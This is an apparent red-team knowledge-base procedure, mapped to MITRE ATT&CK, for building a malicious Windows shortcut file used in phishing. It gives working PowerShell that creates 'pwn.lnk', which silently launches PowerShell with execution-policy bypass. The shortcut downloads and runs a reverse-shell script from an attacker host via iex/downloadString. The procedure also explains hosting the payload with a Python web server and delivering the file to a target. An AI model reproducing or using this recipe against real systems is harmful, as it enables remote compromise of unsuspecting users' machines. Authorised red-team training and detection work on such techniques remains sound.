---
id: ff98e002-b7c2-442a-a4ea-876bc952c31b
name: Create a .LNK with a Custom Payload
type: procedure
verified: true
submitted: true
created_at: '2019-12-09T19:56:59.785189+00:00'
updated_at: '2023-05-25T19:42:16.780779+00:00'
tactics:
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[User Execution|T1204 - User Execution]]'
platforms:
- Windows
tags:
- '[[Phishing]]'
commands:
- '[[Launch a Python 3 Web Server]]'
- '[[PowerShell Create a .LNK File with a PowerShell Payload]]'
---

# Create a .LNK with a Custom Payload

**Status**: ✓ Verified

## Summary

Windows uses the .lnk file format for shortcuts, using these files to point to objects for execution. While these files must be executed by a user, it is a popular avenue for attackers, as they may allow for the execution of arbitrary commands. 

## Description

# Description

Windows uses the .lnk file format for shortcuts, using these files to point to objects for execution. While these files must be executed by a user, it is a popular avenue for attackers, as they may allow for the execution of arbitrary commands.

# Instructions

1. Select a payload. Suggested: [Nishang Revers Shell One-Liner client](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1).

**Code**: [[$client = New-Object System.Net.Sockets.TCPClient(]]

For this example, the shell will be saved as shell.ps1, and hosted using a Python 3 web server on the attacker's machine.

**Command** ([[Launch a Python 3 Web Server]]):

```bash
python3 -m http.server $_PORT
```

2. Use [PowerShell](https://redstack.io/RedTeamLabs--PowerShell.html) to create a .lnk file, which attempts to download and run shell.ps1 on the attacker's machine.

**Command** ([[PowerShell Create a .LNK File with a PowerShell Payload]]):

```bash
$WScript = New-Object -COM WScript.shell
$SC = $WScript.CreateShortcut('pwn.lnk')
$SC.TargetPath="powershell.exe"
$SC.Arguments="-ep bypass -windowstyle hidden iex(New-Object Net.WebClient).downloadString('http://$_ATTACKER_IP/$_FILENAME.ps1')"
$SC.Save()
```

Note: when creating .LNK files, it is often best to create the file on the same version of Windows as the target.

3. Transfer the .LNK file to the target, and upon execution the payload should run.

## Platforms

- Windows

## MITRE ATT&CK Mapping

### Tactics

- [[Execution|TA0002 - Execution]]

### Techniques

- [[User Execution|T1204 - User Execution]]

## Commands Used

- [[Launch a Python 3 Web Server]]
- [[PowerShell Create a .LNK File with a PowerShell Payload]]

## Tags

- [[Phishing]]
